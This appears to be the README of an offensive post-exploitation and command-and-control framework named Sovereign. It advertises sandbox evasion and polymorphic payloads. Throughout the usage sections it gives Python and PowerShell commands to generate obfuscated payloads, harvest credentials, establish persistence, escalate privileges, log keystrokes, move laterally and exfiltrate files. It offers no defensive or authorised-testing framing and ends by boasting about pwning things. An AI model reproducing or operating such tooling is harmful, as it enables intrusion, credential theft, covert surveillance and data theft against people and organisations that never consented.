# Sovereign Post-Exploitation Framework

This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.

## Features

- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
- **Secure Communication**: Encrypted communication between agent and C2 server.
- **Modular Design**: Easily add new modules and functionalities.
- **Cross-Platform Support**: CLI available in both Python (`cli.py`) and PowerShell (`cli.ps1`).
- **Logging and Reporting**: Detailed logging and report generation.

---

## Usage

### Setting Up the C2 Server

1. **Create a Python virtual environment and activate it**:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows: venv\Scripts\activate
    ```

2. **Install the required dependencies**:
    ```bash
    pip install -r c2_server/requirements.txt
    ```

3. **Run the C2 server**:
    ```bash
    python c2_server/c2_server.py
    ```

---

## Using the CLI

The CLI provides various commands to interact with the framework.

### Python CLI (`cli.py`)

#### List all registered agents:
```bash
python cli/cli.py list-agents
```

#### Send a command to a specific agent:
```bash
python cli/cli.py send-command --agent_id AGENT_ID --command "Your command here"
```

#### Generate an obfuscated payload for a specific platform:
```bash
python cli/cli.py generate-payload --platform PLATFORM
```

#### Harvest credentials:
```bash
python cli/cli.py harvest-credentials
```

#### Establish persistence:
```bash
python cli/cli.py establish-persistence
```

#### Escalate privileges:
```bash
python cli/cli.py escalate-privileges
```

#### Gather system information:
```bash
python cli/cli.py gather-system-info --agent_id AGENT_ID
```

#### Exfiltrate data:
```bash
python cli/cli.py exfiltrate-data --file_path /path/to/file
```

#### Start keylogger:
```bash
python cli/cli.py start-keylogger --agent_id AGENT_ID
```

#### Move laterally:
```bash
python cli/cli.py move-laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
```

---

### PowerShell CLI (`cli.ps1`)

For Windows systems, `cli.ps1` provides the same functionality as `cli.py`. Run the following commands in a PowerShell terminal:

#### List all registered agents:
```powershell
.\cli\cli.ps1 list-agents
```

#### Send a command to a specific agent:
```powershell
.\cli\cli.ps1 send-command -agent_id AGENT_ID -command "Your command here"
```

#### Generate an obfuscated payload for a specific platform:
```powershell
.\cli\cli.ps1 generate-payload -platform PLATFORM
```

#### Harvest credentials:
```powershell
.\cli\cli.ps1 harvest-credentials
```

#### Establish persistence:
```powershell
.\cli\cli.ps1 establish-persistence
```

#### Escalate privileges:
```powershell
.\cli\cli.ps1 escalate-privileges
```

#### Gather system information:
```powershell
.\cli\cli.ps1 gather-system-info -agent_id AGENT_ID
```

#### Exfiltrate data:
```powershell
.\cli\cli.ps1 exfiltrate-data -file_path "C:\path\to\file"
```

#### Start keylogger:
```powershell
.\cli\cli.ps1 start-keylogger -agent_id AGENT_ID
```

#### Move laterally:
```powershell
.\cli\cli.ps1 move-laterally -target_ip TARGET_IP -username USERNAME -password PASSWORD
```

---

## Logging and Reporting

Logs are stored in the `c2_server.log` file located in the `c2_server` directory. This file contains detailed information about agent activities and commands executed.

To generate a report from the logged data:

### Using Python:
```bash
python c2_server/c2_server.py generate-report
```

### Using PowerShell:
```powershell
.\cli\cli.ps1 generate-report
```

This will create a `report.txt` file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.

---

## Adding New Modules

To add new post-exploitation modules:

- **Python:** Create a new Python file in the `c2_server/modules` directory and implement the desired functionality.
- **PowerShell:** Add a corresponding PowerShell script in `cli/modules/windows/` if needed.
- Update the CLI scripts (`cli.py` and `cli.ps1`) to include commands for the new module.

---

## Contribution

Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.

---

## License

This project is licensed under the MIT License.

---

# By the way, we pwn things...
